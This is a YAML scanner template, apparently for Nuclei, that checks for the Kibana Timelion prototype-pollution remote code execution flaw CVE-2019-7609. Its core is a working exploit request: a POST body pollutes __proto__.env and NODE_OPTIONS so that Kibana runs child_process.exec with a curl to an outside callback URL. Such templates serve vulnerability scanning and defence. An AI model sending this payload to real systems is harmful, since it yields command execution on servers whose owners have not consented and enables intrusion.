id: yaml-poc-elastic-kibana-rce-CVE-2019-7609
info:
  name: Yaml Poc Elastic Kibana Rce Cve 2019 7609
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-elastic-kibana-rce-CVE-2019-7609'
  tags: rce,cve
  classification:
    cve-id: CVE-2019-7609
  reference:
  - http://packetstormsecurity.com/files/174569/Kibana-Timelion-Prototype-Pollution-Remote-Code-Execution.html
  - http://www.securityfocus.com/bid/107148
  - https://access.redhat.com/errata/RHBA-2019:2824
  - https://access.redhat.com/errata/RHSA-2019:2860
  - https://discuss.elastic.co/t/elastic-stack-6-6-1-and-5-6-15-security-update/169077
http:
- method: GET
  path:
  - /app/kibana
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /api/timelion/run
  body: '{"sheet":[".es(*).props(label.__proto__.env.AAAA=''require(\"child_process\").exec(\"curl
    {{reverseURL}}\");process.exit()//'')\n.props(label.__proto__.env.NODE_OPTIONS=''--require
    /proc/self/environ'')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}

    '
  headers:
    Content-Type: application/json;charset=UTF-8
    kbn-version: '{{version}}'
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /app/canvas
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
